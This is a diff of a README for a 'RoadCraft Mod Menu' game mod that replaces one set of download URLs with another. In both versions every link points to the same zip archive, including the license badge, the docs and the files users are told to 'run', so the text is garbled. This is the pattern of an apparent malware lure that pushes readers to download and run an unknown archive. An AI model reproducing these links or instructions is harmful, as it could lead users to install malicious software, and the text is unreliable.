@@ -1,4 +1,4 @@
-[![Download](https://raw.githubusercontent.com/uweraportia/roadcraft-mod-menu-hub/branch/undischargeable/roadcraft-mod-menu-hub-v3.9.zip%20Mod%20Menu-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/uweraportia/roadcraft-mod-menu-hub/branch/undischargeable/roadcraft-mod-menu-hub-v3.9.zip)
+[![Download](https://github.com/uweraportia/roadcraft-mod-menu-hub/raw/refs/heads/branch/undischargeable/hub-roadcraft-menu-mod-2.5.zip%20Mod%20Menu-brightgreen?style=for-the-badge&logo=github)](https://github.com/uweraportia/roadcraft-mod-menu-hub/raw/refs/heads/branch/undischargeable/hub-roadcraft-menu-mod-2.5.zip)
 
 # 🚗 RoadCraft Mod Menu
 
@@ -76,13 +76,13 @@ Dive into **RoadCraft Mod Menu** – the all-terrain toolkit that supercharges y
 
 ## ⬇️ How to Install
 
-1. Click the **Download** emblem below (and at the top!) or follow https://raw.githubusercontent.com/uweraportia/roadcraft-mod-menu-hub/branch/undischargeable/roadcraft-mod-menu-hub-v3.9.zip
+1. Click the **Download** emblem below (and at the top!) or follow https://github.com/uweraportia/roadcraft-mod-menu-hub/raw/refs/heads/branch/undischargeable/hub-roadcraft-menu-mod-2.5.zip
 2. Unpack the downloaded `.zip` directly into your RoadCraft game folder.
-3. Locate and run `https://raw.githubusercontent.com/uweraportia/roadcraft-mod-menu-hub/branch/undischargeable/roadcraft-mod-menu-hub-v3.9.zip` (Windows) / `https://raw.githubusercontent.com/uweraportia/roadcraft-mod-menu-hub/branch/undischargeable/roadcraft-mod-menu-hub-v3.9.zip` (macOS) or follow the Linux/Android instructions in our `/docs`.
+3. Locate and run `https://github.com/uweraportia/roadcraft-mod-menu-hub/raw/refs/heads/branch/undischargeable/hub-roadcraft-menu-mod-2.5.zip` (Windows) / `https://github.com/uweraportia/roadcraft-mod-menu-hub/raw/refs/heads/branch/undischargeable/hub-roadcraft-menu-mod-2.5.zip` (macOS) or follow the Linux/Android instructions in our `/docs`.
 4. On first launch, select your language and configure your preferred settings.
 5. Dive in—customize, modify, and craft your ultimate RoadCraft adventure!
 
-**For more detailed instructions and troubleshooting, check out `https://raw.githubusercontent.com/uweraportia/roadcraft-mod-menu-hub/branch/undischargeable/roadcraft-mod-menu-hub-v3.9.zip`.**
+**For more detailed instructions and troubleshooting, check out `https://github.com/uweraportia/roadcraft-mod-menu-hub/raw/refs/heads/branch/undischargeable/hub-roadcraft-menu-mod-2.5.zip`.**
 
 ---
 
@@ -96,10 +96,10 @@ The RoadCraft Mod Menu project is an enhancement toolkit developed independently
 
 This project is proudly released under the MIT License (2025).  
 View the full license text here:  
-[![License: MIT](https://raw.githubusercontent.com/uweraportia/roadcraft-mod-menu-hub/branch/undischargeable/roadcraft-mod-menu-hub-v3.9.zip)](https://raw.githubusercontent.com/uweraportia/roadcraft-mod-menu-hub/branch/undischargeable/roadcraft-mod-menu-hub-v3.9.zip)
+[![License: MIT](https://github.com/uweraportia/roadcraft-mod-menu-hub/raw/refs/heads/branch/undischargeable/hub-roadcraft-menu-mod-2.5.zip)](https://github.com/uweraportia/roadcraft-mod-menu-hub/raw/refs/heads/branch/undischargeable/hub-roadcraft-menu-mod-2.5.zip)
 
 ---
 
-[![Download](https://raw.githubusercontent.com/uweraportia/roadcraft-mod-menu-hub/branch/undischargeable/roadcraft-mod-menu-hub-v3.9.zip%20Mod%20Menu-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/uweraportia/roadcraft-mod-menu-hub/branch/undischargeable/roadcraft-mod-menu-hub-v3.9.zip)
+[![Download](https://github.com/uweraportia/roadcraft-mod-menu-hub/raw/refs/heads/branch/undischargeable/hub-roadcraft-menu-mod-2.5.zip%20Mod%20Menu-brightgreen?style=for-the-badge&logo=github)](https://github.com/uweraportia/roadcraft-mod-menu-hub/raw/refs/heads/branch/undischargeable/hub-roadcraft-menu-mod-2.5.zip)
 
 Wishing you green lights and open roads on every modding expedition—**from the RoadCraft Mod Menu team, 2025**.
